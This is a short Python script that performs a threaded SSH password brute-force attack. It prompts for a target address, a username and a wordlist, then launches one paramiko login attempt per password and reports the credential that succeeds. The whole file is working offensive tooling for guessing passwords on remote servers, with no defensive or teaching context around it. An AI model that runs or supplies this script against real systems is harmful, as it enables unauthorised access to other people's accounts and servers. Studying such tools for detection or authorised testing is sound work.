import sys
import threading
import paramiko
import socket
import time
from colorama import init, Fore
import os

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

stop_flag=0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host,port=22, username=username, password=password)
        stop_flag = 1
        print(Fore.GREEN + '[+] Found password: ' + password + ' , for account: ' + username)
    except:
        print(Fore.RED + '[-] Incorrect login, the password doesn\'t match: ' + password)
    ssh.close()
    


host = input('[*] Target address: ')
username = input('[*] SSH Username: ')
input_file = input('[*] Passwords dictionary: ')
print('\n')

if os.path.exists(input_file) == False:
    print(Fore.RED + '[!] That dictionary/path doesnt exist')
    sys.exit(1)

print('* * * Starting threaded SSH bruteforce on ' + host + ' with account: ' + username + ' * * *\n')

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t=threading.Thread(target=ssh_connect, args=(password,)) # object thread
        t.start()
        time.sleep(0.5)